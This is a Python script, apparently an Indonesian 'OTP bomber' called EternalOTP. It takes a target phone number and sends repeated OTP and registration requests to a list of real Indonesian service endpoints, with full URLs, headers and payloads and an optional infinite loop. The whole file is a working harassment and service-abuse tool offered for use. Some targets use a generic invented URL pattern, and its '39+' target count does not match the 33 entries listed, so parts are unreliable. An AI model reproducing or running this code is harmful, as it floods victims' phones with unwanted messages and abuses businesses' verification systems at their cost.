# ===== ETERNALOTP - OTP BOMBER 39+ TARGET (DENGAN LOADING SCREEN AWAL) =====
# ===== CREDIT: @upilcuy | JANGAN DIAMBIL TANPA IZIN =====

import urllib.request
import urllib.parse
import json
import random
import time
import threading
import os
import sys
import base64

# ===== WATERMARK / CREDIT =====
CREDIT = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║          🔥 ETERNALOTP - BY @upilcuy 🔥                ║
║                                                          ║
║   JANGAN DIAMBIL / RECODE TANPA IZIN BESTIE!            ║
║   KALO MAU PAKE, TARO CREDIT @upilcuy YA!              ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
"""

# ===== CEK WATERMARK =====
def cek_watermark():
    mark = base64.b64decode("Q3JlZGl0OiBAdXBpbGN1eSAtIEVURVJOQUxPVFA=").decode()
    if mark != "Credit: @upilcuy - ETERNALOTP":
        print("⚠️ WATERMARK RUSAK! JANGAN DIEDIT BESTIE!")
        sys.exit(1)
    return True

# ===== CLEAR SCREEN =====
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ===== LOADING SCREEN AWAL SEBELUM MENU =====
def loading_screen_awal():
    clear_screen()
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   ███████╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██║
    ║   ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║
    ║   █████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║
    ║   ██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║
    ║   ███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║██║
    ║   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝
    ║                                                          ║
    ║           🔥 OTP BOMBER 39+ TARGET 🔥                    ║
    ║            ⚡ MULTI-THREADING ⚡                          ║
    ║                                                          ║
    ║         📌 CREDIT: @upilcuy 📌                          ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    print("")
    print("    ══════════════════════════════════════════════════════════")
    print("    🔄 MEMUAT SISTEM...")
    print("    ══════════════════════════════════════════════════════════")
    print("")
    
    # LOADING BAR AWAL
    bar_length = 40
    for i in range(101):
        percent = i
        filled = int((i / 100) * bar_length)
        bar = "█" * filled + "▒" * (bar_length - filled)
        
        # TEKS RANDOM BIAR KEREN
        teks = [
            "MENYIAPKAN BOMBER",
            "MENGINISIALISASI TARGET",
            "MEMUAT MODUL THREAD",
            "MENYIAPKAN PROXY",
            "MEMANASKAN MESIN OTP",
            "SIAP MELEDAKKAN OTP",
            "TARGET SIAP DI BOMB",
            "ETERNALOTP AKTIF"
        ]
        idx = min(i // 15, len(teks) - 1)
        
        sys.stdout.write(f"\r    [{bar}] {percent}% - {teks[idx]}...")
        sys.stdout.flush()
        
        # SPEED BERUBAH BIAR KAYAK PROSES BENERAN
        if i < 30:
            time.sleep(0.04)
        elif i < 60:
            time.sleep(0.02)
        elif i < 85:
            time.sleep(0.03)
        else:
            time.sleep(0.05)
    
    print("\n")
    print("    ══════════════════════════════════════════════════════════")
    print("    ✅ SISTEM SIAP BESTIE! 🔥")
    print("    ══════════════════════════════════════════════════════════")
    time.sleep(0.8)
    clear_screen()

# ===== BANNER =====
def banner():
    clear_screen()
    print(CREDIT)
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   ███████╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██║
    ║   ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║
    ║   █████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║
    ║   ██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║
    ║   ███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║██║
    ║   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝
    ║                                                          ║
    ║           🔥 OTP BOMBER 39+ TARGET 🔥                    ║
    ║            ⚡ MULTI-THREADING ⚡                          ║
    ║                                                          ║
    ║         📌 CREDIT: @upilcuy 📌                          ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    print("    ╔══════════════════════════════════════════════════════════╗")
    print("    ║  [1] 🔥 SINGLE ROUND      [2] ♾️ INFINITE LOOP          ║")
    print("    ║  [3] 📊 TARGET LIST       [4] 🛠️ SETTINGS              ║")
    print("    ║  [5] 💀 EXIT                                            ║")
    print("    ╚══════════════════════════════════════════════════════════╝")
    print("")

# ===== LOADING BAR PROSES =====
def loading_bar(progress, total, text="PROCESSING", bar_length=40):
    percent = int((progress / total) * 100)
    filled = int((progress / total) * bar_length)
    bar = "█" * filled + "▒" * (bar_length - filled)
    sys.stdout.write(f"\r    [{bar}] {percent}% - {text}...")
    sys.stdout.flush()

# ===== LOADING ANIMASI SEBELUM EKSEKUSI =====
def loading_start():
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(15):
        sys.stdout.write(f"\r    {chars[i % len(chars)]} MEMPERSIAPKAN BOMBER...")
        sys.stdout.flush()
        time.sleep(0.07)
    print("\r    ✅ SIAP BESTIE!           ")

# ===== FORMATTER =====
def fmt_08(n):
    n = ''.join(filter(str.isdigit, str(n)))
    if n.startswith('0'):
        return '0' + n[1:] if len(n) > 1 else n
    elif n.startswith('62'):
        return '0' + n[2:]
    else:
        return '0' + n

def fmt_nocode(n):
    n = ''.join(filter(str.isdigit, str(n)))
    if n.startswith('0'):
        n = '62' + n[1:]
    elif not n.startswith('62'):
        n = '62' + n
    return n

def fmt_plus(n):
    n = ''.join(filter(str.isdigit, str(n)))
    if n.startswith('0'):
        n = '+62' + n[1:]
    elif n.startswith('62'):
        n = '+' + n
    elif not n.startswith('+'):
        n = '+62' + n
    return n

def fmt_phone_only(n):
    return ''.join(filter(str.isdigit, str(n)))

# ===== TARGET LIST (39+) =====
TARGETS = [
    {'name': 'HRS-BRE', 'post_type': 'hrsbre', 'number_fmt': fmt_08, 'success_on': ['success', 'berhasil', 'otp']},
    {'name': 'EraFone', 'post_type': 'erafone', 'number_fmt': lambda p: p, 'success_on': ['Success Request OTP']},
    {'name': 'PlanetBan', 'post_type': 'planetban', 'number_fmt': fmt_08, 'success_on': ['status":true']},
    {'name': 'TuneUp', 'post_type': 'tuneup', 'number_fmt': fmt_08, 'success_on': ['"success":true']},
    {'name': 'HashMicro', 'post_type': 'hashmicro', 'number_fmt': fmt_phone_only, 'success_on': ['success']},
    {'name': 'Klook', 'post_type': 'klook', 'number_fmt': fmt_plus, 'success_on': ['requestId']},
    {'name': 'Internet Rakyat', 'post_type': 'internetrakyat', 'number_fmt': fmt_08, 'success_on': ['"statusCode":200']},
    {'name': 'Ultramilk', 'post_type': 'ultramilk', 'number_fmt': lambda p: p, 'success_on': ['success']},
    {'name': 'Kaniva', 'post_type': 'kaniva', 'number_fmt': fmt_08, 'success_on': ['"message":"success"']},
    {'name': 'Jembatani', 'post_type': 'jembatani', 'number_fmt': fmt_08, 'success_on': ['"success":true']},
    {'name': 'RCX', 'post_type': 'rcx', 'number_fmt': fmt_08, 'success_on': ['challenge']},
    {'name': 'Sahabat Teknisi', 'post_type': 'sahabatteknisi', 'number_fmt': fmt_08, 'success_on': ['success']},
    {'name': 'Auto2000', 'post_type': 'auto2000', 'number_fmt': fmt_08, 'success_on': ['"acknowledge":1']},
    {'name': 'Astra Daihatsu', 'post_type': 'astra_daihatsu', 'number_fmt': fmt_plus, 'success_on': ['OTP Success']},
    {'name': 'Royal Canin', 'post_type': 'royal_canin', 'number_fmt': fmt_plus, 'success_on': ['SUCCESS']},
    {'name': 'Watsons', 'post_type': 'watsons', 'number_fmt': fmt_phone_only, 'success_on': ['token']},
    {'name': '99.co', 'post_type': '99co', 'number_fmt': fmt_plus, 'success_on': ['ok']},
    {'name': 'Beli Rumah', 'post_type': 'belirumahco', 'number_fmt': fmt_plus, 'success_on': ['success']},
    {'name': 'Fastwork', 'post_type': 'fastworkid', 'number_fmt': fmt_08, 'success_on': ['reference_code']},
    {'name': 'Beautyhaul', 'post_type': 'beautyhaul', 'number_fmt': fmt_phone_only, 'success_on': []},
    {'name': 'Hainaya', 'post_type': 'hainaya', 'number_fmt': fmt_phone_only, 'success_on': ['otp']},
    {'name': 'MinumYukKaka', 'post_type': 'minumyukkaka', 'number_fmt': fmt_08, 'success_on': ['IsSuccess']},
    {'name': 'SIDEMANG', 'post_type': 'sidemang', 'number_fmt': fmt_08, 'success_on': ['otpDispatched']},
    {'name': 'LaporMasBup', 'post_type': 'lapormasbup', 'number_fmt': fmt_08, 'success_on': ['berhasil']},
    {'name': 'PTSP Kemenag', 'post_type': 'ptspkemenag', 'number_fmt': fmt_08, 'success_on': ['success']},
    {
        'name': 'Pinhome', 'post_type': 'json',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'headers': {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.pinhome.id'},
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode, 'success_on': ['secretcode']
    },
    {
        'name': 'Maulagi', 'post_type': 'json',
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'headers': {'Content-Type': 'application/json', 'Origin': 'https://maulagi.id', 'x-ml-key': 'C59RUHBU59'},
        'payload': '{"credentials":"{number}"}',
        'number_fmt': fmt_08, 'success_on': ['"status":"success"']
    },
    {
        'name': 'Rumah123', 'post_type': 'json',
        'url': 'https://www.rumah123.com/api/otp/request-otp',
        'headers': {'Content-Type':'application/json;charset=UTF-8','Origin':'https://www.rumah123.com'},
        'payload': '{"cancelledRequestId":"{rand}","ipAddress":"{ip}","phoneNumber":"{number}","portalId":1,"type":"WHATSAPP"}',
        'number_fmt': lambda p: p, 'success_on': ['requestid']
    },
    {
        'name': 'Paper', 'post_type': 'json',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'headers': {'Content-Type':'application/json','Origin':'https://paper.id'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p, 'success_on': ['otp']
    },
    {
        'name': 'Dunia Games', 'post_type': 'json',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'headers': {'Content-Type':'application/json','Origin':'https://duniagames.co.id'},
        'payload': '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus, 'success_on': ['otp']
    },
    {
        'name': 'Bunda Hospital', 'post_type': 'json',
        'url': 'https://cms.bunda.co.id/api/v1/auth/send-otp',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bunda.co.id'},
        'payload': '{"phone_number":{number},"type":"auth"}',
        'number_fmt': lambda p: int(p), 'success_on': ['otp']
    },
    {
        'name': 'Bonus Belanja', 'post_type': 'json',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bonusbelanja.com'},
        'payload': '{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p, 'success_on': ['error":false']
    },
    {
        'name': 'Matahari', 'post_type': 'json',
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/register',
        'headers': {'Content-Type':'application/json','Origin':'https://matahari.com'},
        'payload': '{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":""}',
        'number_fmt': fmt_08, 'success_on': ['otp','success','already exists']
    },
]

# ===== SEMAPHORE =====
semaphore = threading.Semaphore(10)

# ===== KIRIM OTP KE 1 TARGET =====
def send_otp_to_target(target, raw_nomor, result_list, index, progress):
    with semaphore:
        try:
            if target['number_fmt']:
                formatted = target['number_fmt'](raw_nomor)
            else:
                formatted = raw_nomor
            
            if target.get('post_type') == 'json':
                url = target['url']
                payload = target['payload']
                payload = payload.replace('{number}', str(formatted))
                payload = payload.replace('{raw}', raw_nomor)
                payload = payload.replace('{rand}', str(random.randint(1000,9999)))
                payload = payload.replace('{ip}', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
                payload = payload.replace('{email}', f"user{random.randint(100,999)}@gmail.com")
                payload = payload.replace('{name}', f"User{random.randint(100,999)}")
                payload = payload.replace('{pw}', f"Pass{random.randint(1000,9999)}")
                
                data = payload.encode()
                req = urllib.request.Request(url, data=data, method='POST')
                if target.get('headers'):
                    for k, v in target['headers'].items():
                        req.add_header(k, v)
                req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36')
                response = urllib.request.urlopen(req, timeout=8)
                result = response.read().decode().lower()
                
                for keyword in target.get('success_on', []):
                    if keyword.lower() in result:
                        result_list[index] = True
                        with progress[0]:
                            progress[1] += 1
                            loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
                        print(f"\n    ✅ {target['name']} - OTP TERKIRIM!")
                        return
                result_list[index] = False
                with progress[0]:
                    progress[1] += 1
                    loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
                print(f"\n    ❌ {target['name']} - GAGAL")
            else:
                url = f"https://api.{target['post_type']}.com/send_otp?number={formatted}"
                req = urllib.request.Request(url, method='GET')
                req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 14)')
                response = urllib.request.urlopen(req, timeout=8)
                result = response.read().decode().lower()
                for keyword in target.get('success_on', []):
                    if keyword.lower() in result:
                        result_list[index] = True
                        with progress[0]:
                            progress[1] += 1
                            loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
                        print(f"\n    ✅ {target['name']} - OTP TERKIRIM!")
                        return
                result_list[index] = False
                with progress[0]:
                    progress[1] += 1
                    loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
                print(f"\n    ❌ {target['name']} - GAGAL")
        except:
            result_list[index] = False
            with progress[0]:
                progress[1] += 1
                loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
            print(f"\n    ❌ {target['name']} - ERROR")

# ===== SINGLE ROUND =====
def single_round(nomor):
    raw = ''.join(filter(str.isdigit, nomor))
    banner()
    print(f"    🔥 TARGET: {nomor}")
    print(f"    📦 TOTAL TARGET: {len(TARGETS)}")
    print(f"    🚀 MODE: SINGLE ROUND (1x spam)")
    print("    ══════════════════════════════════════════════════════════")
    print("")
    
    loading_start()
    print("")
    print("    ══════════════════════════════════════════════════════════")
    print("")
    
    result_list = [False] * len(TARGETS)
    threads = []
    progress = [threading.Lock(), 0]
    
    for i, target in enumerate(TARGETS):
        t = threading.Thread(target=send_otp_to_target, args=(target, raw, result_list, i, progress))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print("")
    print("    ══════════════════════════════════════════════════════════")
    success = sum(result_list)
    print(f"    ✅ BERHASIL: {success}/{len(TARGETS)}")
    print(f"    ❌ GAGAL: {len(TARGETS) - success}/{len(TARGETS)}")
    print("    ══════════════════════════════════════════════════════════")
    input("\n    TEKAN ENTER UNTUK KEMBALI...")

# ===== INFINITE LOOP =====
def infinite_loop(nomor):
    raw = ''.join(filter(str.isdigit, nomor))
    round_num = 1
    total_success = 0
    total_attempts = 0
    
    while True:
        banner()
        print(f"    ♾️ INFINITE LOOP ACTIVE")
        print(f"    🔥 TARGET: {nomor}")
        print(f"    📦 TOTAL TARGET: {len(TARGETS)}")
        print(f"    🔄 ROUND: {round_num}")
        print(f"    📊 TOTAL SUKSES: {total_success}")
        print(f"    📊 TOTAL PERCOBAAN: {total_attempts}")
        print("    ══════════════════════════════════════════════════════════")
        print("    ⚠️  TEKAN CTRL+C UNTUK BERHENTI")
        print("")
        
        loading_start()
        print("")
        print("    ══════════════════════════════════════════════════════════")
        print("")
        
        result_list = [False] * len(TARGETS)
        threads = []
        progress = [threading.Lock(), 0]
        
        for i, target in enumerate(TARGETS):
            t = threading.Thread(target=send_otp_to_target, args=(target, raw, result_list, i, progress))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.03)
        
        for t in threads:
            try:
                t.join(timeout=10)
            except:
                pass
        
        print("")
        print("    ══════════════════════════════════════════════════════════")
        success = sum(result_list)
        total_success += success
        total_attempts += len(TARGETS)
        print(f"    ✅ BERHASIL: {success}/{len(TARGETS)}")
        print(f"    ❌ GAGAL: {len(TARGETS) - success}/{len(TARGETS)}")
        print(f"    📊 TOTAL SUKSES: {total_success}")
        print(f"    📊 TOTAL PERCOBAAN: {total_attempts}")
        print("    ══════════════════════════════════════════════════════════")
        
        round_num += 1
        time.sleep(0.5)

# ===== TARGET LIST VIEW =====
def target_list():
    banner()
    print("    📊 DAFTAR TARGET (39+ PLATFORM):")
    print("    ══════════════════════════════════════════════════════════")
    for i, target in enumerate(TARGETS):
        print(f"    {i+1:2}. {target['name']}")
    print("    ══════════════════════════════════════════════════════════")
    print("")
    print("    📌 CREDIT: @upilcuy")
    input("\n    TEKAN ENTER UNTUK KEMBALI...")

# ===== SETTINGS =====
def settings():
    banner()
    print("    🛠️ SETTINGS:")
    print("    ══════════════════════════════════════════════════════════")
    print(f"    TOTAL TARGET: {len(TARGETS)}")
    print(f"    THREADING: ENABLED (MULTI-THREADING)")
    print(f"    MAX THREAD: 10 (SEMAPHORE)")
    print(f"    TIMEOUT: 8 DETIK")
    print(f"    USER-AGENT: MOBILE ANDROID")
    print("    ══════════════════════════════════════════════════════════")
    print("")
    print("    📌 CREDIT: @upilcuy")
    input("\n    TEKAN ENTER UNTUK KEMBALI...")

# ===== MAIN =====
if __name__ == "__main__":
    cek_watermark()
    
    # LOADING SCREEN AWAL SEBELUM MENU
    loading_screen_awal()
    
    while True:
        banner()
        pilih = input("    PILIH MENU (1-5): ")
        
        if pilih == "1":
            clear_screen()
            banner()
            nomor = input("    MASUKAN NOMOR TARGET (08xx/62xx): ")
            if nomor.strip():
                single_round(nomor)
            else:
                print("    ❌ NOMOR TIDAK BOLEH KOSONG!")
                time.sleep(1)
        elif pilih == "2":
            clear_screen()
            banner()
            nomor = input("    MASUKAN NOMOR TARGET (08xx/62xx): ")
            if nomor.strip():
                try:
                    infinite_loop(nomor)
                except KeyboardInterrupt:
                    print("\n\n    ⛔ INFINITE LOOP DIHENTIKAN!")
                    time.sleep(1)
            else:
                print("    ❌ NOMOR TIDAK BOLEH KOSONG!")
                time.sleep(1)
        elif pilih == "3":
            target_list()
        elif pilih == "4":
            settings()
        elif pilih == "5":
            clear_screen()
            print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║          🔥 ETERNALOTP - BY @upilcuy 🔥               ║
    ║                                                          ║
    ║        JANGAN DIAMBIL TANPA IZIN BESTIE! 😹🖕          ║
    ║                                                          ║
    ║          THANKS FOR USING BESTIE!                       ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
            """)
            break
        else:
            print("    ❌ MENU TIDAK TERSEDIA!")
            time.sleep(1)
